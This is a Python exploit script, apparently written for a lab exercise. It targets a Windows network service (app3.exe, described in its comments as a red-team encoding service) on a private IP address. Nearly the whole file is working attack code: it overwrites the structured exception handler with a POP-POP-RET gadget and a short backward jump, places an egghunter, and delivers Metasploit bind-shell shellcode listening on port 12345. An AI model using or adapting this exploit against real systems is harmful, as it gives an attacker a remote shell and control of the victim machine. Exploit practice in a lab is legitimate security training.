import os 
import struct
import socket

class Exploit:
    IP = "192.168.62.128"
    PORT = 443
    BUFF_SIZE = 4096

    PATTERN_FILE = os.getcwd() + "\\pattern.txt"
    BADCHAR_FILE = os.getcwd() + "\\badchar.bin"

    NSEH_OFFSET = 528

    @classmethod
    def generate_badchar(cls):
        badchar_str = b""
        badchar_list = [0x00]

        # badchar only 0x00
        for i in range(0x00, 0xff + 1):
            if i not in badchar_list:
                badchar_str += struct.pack("B", i)

        with open(cls.BADCHAR_FILE, "wb+") as bf:
            bf.write(badchar_str)

        return badchar_str

    @classmethod
    def conv_addr(cls, addr):
        return struct.pack("<I", addr)

    @classmethod
    def get_pattern(cls):
        pattern = open(cls.PATTERN_FILE, "rb").read()
        return pattern

    @classmethod
    def test_connection(cls):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect((cls.IP, cls.PORT))

            # Welcome to Red Team encryption/encoding service.
            # Select 1 for simple echo back service.
            # Select 2 for AES encryption service.
            # Select 3 for Custom Encoding Service.
            reply_from_server = sock.recv(cls.BUFF_SIZE)
            print(reply_from_server.decode())

            # Selected custom encoding service.
            # Initializing encoding module.
            # Encoder module initialized.
            # Please limit file size up to 500 bytes.
            # Send your data stream now.
            sock.sendall(b"3")
            reply_from_server = sock.recv(cls.BUFF_SIZE)
            print(reply_from_server.decode())

            # short jmp backwards -128 bytes
            NSEH = cls.conv_addr(0xb4eb9090)
            jmp_back = NSEH

            # 0x0041dc2a : {pivot 8 / 0x08} :  # POP EDI # POP ESI # RETN    ** [app3.exe] **   |  startnull {PAGE_EXECUTE_READ}
            SEH = cls.conv_addr(0x0041dc2a)     

            egghunter =  b"\x66\x81\xca\xff\x0f\x42\x52\x6a"
            egghunter += b"\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8"
            egghunter += b"\x57\x30\x30\x54" # W00T
            egghunter += b"\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

            egg = b"\x57\x30\x30\x54\x57\x30\x30\x54" # W00TW00T      

            
            # msf5 payload(windows/shell_bind_tcp) > options
            #
            # Module options (payload/windows/shell_bind_tcp):
            #
            # Name      Current Setting  Required  Description
            # ----      ---------------  --------  -----------
            # EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
            # LPORT     12345            yes       The listen port
            # RHOST                      no        The target address
            #
            # msf5 payload(windows/shell_bind_tcp) > generate -f python -b "\x00\x0a\x0d"
            
            shellcode  = egg
            shellcode += b"\xbf\x71\xa8\xda\xa8\xda\xc0\xd9\x74\x24\xf4\x5d\x31"
            shellcode += b"\xc9\xb1\x53\x31\x7d\x12\x83\xc5\x04\x03\x0c\xa6\x38"
            shellcode += b"\x5d\x12\x5e\x3e\x9e\xea\x9f\x5f\x16\x0f\xae\x5f\x4c"
            shellcode += b"\x44\x81\x6f\x06\x08\x2e\x1b\x4a\xb8\xa5\x69\x43\xcf"
            shellcode += b"\x0e\xc7\xb5\xfe\x8f\x74\x85\x61\x0c\x87\xda\x41\x2d"
            shellcode += b"\x48\x2f\x80\x6a\xb5\xc2\xd0\x23\xb1\x71\xc4\x40\x8f"
            shellcode += b"\x49\x6f\x1a\x01\xca\x8c\xeb\x20\xfb\x03\x67\x7b\xdb"
            shellcode += b"\xa2\xa4\xf7\x52\xbc\xa9\x32\x2c\x37\x19\xc8\xaf\x91"
            shellcode += b"\x53\x31\x03\xdc\x5b\xc0\x5d\x19\x5b\x3b\x28\x53\x9f"
            shellcode += b"\xc6\x2b\xa0\xdd\x1c\xb9\x32\x45\xd6\x19\x9e\x77\x3b"
            shellcode += b"\xff\x55\x7b\xf0\x8b\x31\x98\x07\x5f\x4a\xa4\x8c\x5e"
            shellcode += b"\x9c\x2c\xd6\x44\x38\x74\x8c\xe5\x19\xd0\x63\x19\x79"
            shellcode += b"\xbb\xdc\xbf\xf2\x56\x08\xb2\x59\x3f\xfd\xff\x61\xbf"
            shellcode += b"\x69\x77\x12\x8d\x36\x23\xbc\xbd\xbf\xed\x3b\xc1\x95"
            shellcode += b"\x4a\xd3\x3c\x16\xab\xfa\xfa\x42\xfb\x94\x2b\xeb\x90"
            shellcode += b"\x64\xd3\x3e\x0c\x6c\x72\x91\x33\x91\xc4\x41\xf4\x39"
            shellcode += b"\xad\x8b\xfb\x66\xcd\xb3\xd1\x0f\x66\x4e\xda\x1f\x4e"
            shellcode += b"\xc7\x3c\x35\xa0\x81\x97\xa1\x02\xf6\x2f\x56\x7c\xdc"
            shellcode += b"\x07\xf0\x35\x36\x9f\xff\xc5\x1c\xb7\x97\x4d\x73\x03"
            shellcode += b"\x86\x51\x5e\x23\xdf\xc6\x14\xa2\x92\x77\x28\xef\x44"
            shellcode += b"\x1b\xbb\x74\x94\x52\xa0\x22\xc3\x33\x16\x3b\x81\xa9"
            shellcode += b"\x01\x95\xb7\x33\xd7\xde\x73\xe8\x24\xe0\x7a\x7d\x10"
            shellcode += b"\xc6\x6c\xbb\x99\x42\xd8\x13\xcc\x1c\xb6\xd5\xa6\xee"
            shellcode += b"\x60\x8c\x15\xb9\xe4\x49\x56\x7a\x72\x56\xb3\x0c\x9a"
            shellcode += b"\xe7\x6a\x49\xa5\xc8\xfa\x5d\xde\x34\x9b\xa2\x35\xfd"
            shellcode += b"\xbb\x40\x9f\x08\x54\xdd\x4a\xb1\x39\xde\xa1\xf6\x47"
            shellcode += b"\x5d\x43\x87\xb3\x7d\x26\x82\xf8\x39\xdb\xfe\x91\xaf"
            shellcode += b"\xdb\xad\x92\xe5"

            nop = b"\x90" * (cls.NSEH_OFFSET - 106 - len(shellcode))

            bof  = b""
            bof += nop
            bof += shellcode
            bof += b"\x90" * (106 - len(egghunter))
            bof += egghunter
            bof += NSEH
            bof += SEH

            sock.sendall(bof)

            reply_from_server = sock.recv(cls.BUFF_SIZE)
            print(reply_from_server.decode())

if __name__ == "__main__":
    Exploit.test_connection()   